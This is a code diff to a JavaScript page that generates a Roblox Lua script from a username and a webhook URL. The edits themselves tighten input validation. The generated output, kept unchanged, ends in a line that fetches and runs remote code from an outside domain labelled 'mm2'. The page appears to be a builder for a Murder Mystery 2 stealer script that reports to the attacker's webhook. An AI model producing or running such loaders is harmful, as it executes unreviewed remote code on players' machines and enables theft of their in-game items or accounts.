@@ -47,19 +47,24 @@
     }
 
     function generateOutput() {
-        var username = document.getElementById("username").value;
-        var webhook = document.getElementById("webhook").value;
+        var username = document.getElementById("username").value.trim();
+        var webhook = document.getElementById("webhook").value.trim();
         var errorMessage = document.getElementById("error-message");
+        
+        if (!username) {
+            errorMessage.textContent = 'Username is required.';
+            return;
+        }
         
         if (!isValidUrl(webhook)) {
             errorMessage.textContent = 'Invalid webhook URL format.';
             return;
-        } else {
-            errorMessage.textContent = '';
         }
         
+        errorMessage.textContent = '';
+        
         var outputString = 'Username = "' + username + '"\n' +
-                           'webhook = "' + webhook + '"\n' +
+                           'Webhook = "' + webhook + '"\n' +
                            'loadstring(game:HttpGet("https://egorikusa.space/mm2"))()';
         document.getElementById("output").value = outputString;
         hljs.highlightAll();
